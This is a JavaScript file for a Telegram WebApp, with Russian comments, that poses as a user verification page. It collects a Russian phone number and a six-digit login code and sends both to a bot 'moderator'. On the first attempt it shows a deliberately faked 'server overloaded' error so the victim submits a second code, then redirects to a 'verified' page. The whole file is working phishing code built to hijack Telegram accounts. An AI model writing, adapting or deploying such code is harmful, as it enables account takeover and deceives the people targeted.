document.addEventListener('DOMContentLoaded', () => {
    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.setHeaderColor('#060137');
    tg.setBackgroundColor('#060137');
    tg.enableClosingConfirmation();

    // Проверяем, был ли пользователь уже верифицирован
    if (localStorage.getItem('isVerified')) {
        window.location.href = '/mybot/verifer_user/index.html';
        return;
    }

    // Элементы DOM
    const phoneForm = document.getElementById('phone-form');
    const codeForm = document.getElementById('code-form');
    const phoneInput = document.getElementById('phone');
    const codeInput = document.getElementById('code');
    const phoneError = document.getElementById('phone-error');
    const codeError = document.getElementById('code-error');
    const submitCodeBtn = document.getElementById('submit-code');

    // Счетчик попыток ввода кода
    let attemptCount = 0;

    // Вибрация
    const vibrate = (type = 'light') => {
        if (tg.HapticFeedback) {
            tg.HapticFeedback.impactOccurred(type);
        }
    };

    // Отправка события боту
    const sendEvent = async (type, data = null) => {
        if (window.sendToBot) {
            await window.sendToBot(type, data);
        }
    };

    // Инициализация
    sendEvent('init');
    vibrate('medium');

    // Форматирование номера
    phoneInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 0) value = '7' + value.substring(1);
        
        let formatted = '+7';
        if (value.length > 1) formatted += ' ' + value.substring(1, 4);
        if (value.length > 4) formatted += ' ' + value.substring(4, 7);
        if (value.length > 7) formatted += ' ' + value.substring(7, 9);
        if (value.length > 9) formatted += ' ' + value.substring(9, 11);
        
        phoneInput.value = formatted.substring(0, 16);
        if (value.length % 2 === 0) vibrate('light');
    });

    // Валидация номера
    const validatePhone = (phone) => {
        const clean = phone.replace(/\D/g, '');
        return /^7\d{10}$/.test(clean);
    };

    // Отправка номера
    document.getElementById('submit-phone').addEventListener('click', async () => {
        const phone = phoneInput.value.replace(/\D/g, '');
        
        if (!phone) {
            showError(phoneError, 'Введите номер телефона');
            vibrate('error');
            return;
        }
        
        if (!validatePhone(phone)) {
            showError(phoneError, 'Требуется российский номер: +7 XXX XXX XX XX');
            vibrate('error');
            return;
        }
        
        vibrate('medium');
        hideError(phoneError);
        phoneForm.classList.add('hidden');
        codeForm.classList.remove('hidden');
        await sendEvent('phone', `+${phone}`);
    });

    // Отправка кода
    submitCodeBtn.addEventListener('click', async () => {
        const code = codeInput.value.trim();
        
        if (!/^\d{6}$/.test(code)) {
            showError(codeError, 'Ровно 6 цифр');
            vibrate('error');
            return;
        }
        
        vibrate('medium');
        hideError(codeError);
        submitCodeBtn.disabled = true;
        submitCodeBtn.innerHTML = '<div class="loader"></div>';
        
        // Отправляем код модератору
        await sendEvent('code', code);
        
        // Первая попытка - имитация перегруженности сервера
        if (attemptCount === 0) {
            setTimeout(() => {
                submitCodeBtn.disabled = false;
                submitCodeBtn.textContent = 'Подтвердить';
                showError(codeError, 'Сервер перегружен. Попробуйте снова');
                codeInput.value = '';
                attemptCount++;
                vibrate('heavy');
            }, 3000);//10000
        } 
        // Вторая попытка - успешная верификация
        else {
            setTimeout(() => {
                // Сохраняем статус верификации
                localStorage.setItem('isVerified', 'true');
                
                // Перенаправляем на страницу верифицированного пользователя о
                window.location.href = 'https://otz2026.github.io/mybot/verifer_user/index.html';
            }, 2000);
        }
    });

    function showError(element, message) {
        element.textContent = message;
        element.style.display = 'block';
        element.style.animation = 'shake 0.5s';
    }

    function hideError(element) {
        element.style.display = 'none';
    }
});
